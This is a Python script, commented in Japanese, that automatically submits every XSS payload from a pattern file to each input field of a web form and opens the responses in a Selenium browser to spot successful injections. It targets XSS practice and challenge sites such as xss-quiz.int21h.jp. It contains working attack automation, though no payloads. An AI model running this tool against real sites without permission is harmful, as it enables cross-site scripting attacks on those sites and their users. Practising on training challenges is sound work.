#指定したURLにxss_patternファイルにあるXSSパターンをすべて打ち込むスクリプト 
#inputタグがあるフォームにしか使えない
from selenium import webdriver
from selenium.webdriver.common.alert import Alert
import time
from bs4 import BeautifulSoup
import requests
import re

def xss_insert(s,url,method,xss):
    if method == "get":
        print("method = get")
        for x in xss:
            data = {}
            for n in name:
                data[n] = x   #送信するパラメータ
                r2 = s.get(url,params=data)
                URL = r2.url
                driver.execute_script("window.open("+"'"+URL+"'" +", 'newtab')") #JavaScriptで新規タブを開く
    else:
        print("method = post")
        for x in xss:
            data = {}
            for n in name:
                data[n] = x  
                r2 = s.post(url,data=data)
                URL = r2.url
                driver.execute_script("window.open("+"'"+URL+"'" +", 'newtab')")

#相対URLか絶対URLかで、送信先を決める
def check_url(soup,url):
    action = soup.find("form").get("action")
    if isinstance(re.match("http",action),type(None)):
        return url+action
    else:
        return url

#------------------------------------main----------------------------------------------------------------#

#xss.txtから、xssのパターンをxss配列に書き込む
xss = []
with open("xss_pattern","r") as f:
    xss = f.read().splitlines()

driver = webdriver.Chrome()
#---------------------------xsssample------------------------------------------------#
#url="http://bogus.jp/xsssample/xsssample_01.php"
#url = "http://bogus.jp/xsssample/xsssample_02_M9eec.php"
#url = "http://bogus.jp/xsssample/xsssample_03_J4Skr.php"
#url = "http://bogus.jp/xsssample/xsssample_04_C_HD-.php"
#url = "http://bogus.jp/xsssample/xsssample_05_3S7LA.php" #できない
#url="http://bogus.jp/xsssample/xsssample_06_w6k2v.php"
#url="http://bogus.jp/xsssample/xsssample_07_qqoXM.php"
#url="http://bogus.jp/xsssample/xsssample_08_sv8ec.php"
#url="http://bogus.jp/xsssample/xsssample_11.php" #できない
#url = "http://bogus.jp/xsssample/xsssample_11.php"
#url = "http://bogus.jp/xsssample/xsssample_12.php"
#url = "http://bogus.jp/xsssample/xsssample_13.php" #できない
#url = "http://bogus.jp/xsssample/xsssample_14.php"
#-------------------------xssgame-------------------------------------------------------#
#url = "https://xss-game.appspot.com/level1/frame"
#url = "https://xss-game.appspot.com/level2/frame"
#------------------------------xsschallenge-----------------------------------------------#
url = "https://xss-quiz.int21h.jp/"

s = requests.session()
r = s.get(url)
html = r.text
soup = BeautifulSoup(html,"html.parser")
input = []
name = []
input = soup.find_all("input")
for i in range(len(input)-1):
    name.append(input[i].get("name"))
driver.get(url)
#絶対URLか相対URLか判定
action = check_url(soup,url)
print("action =",action)

#xss入力
if soup.find("form").get("method").lower() == "get":
    method = "get"
    xss_insert(s,action,method,xss)

else:
    method = "post"
    xss_insert(s,action,method,xss)



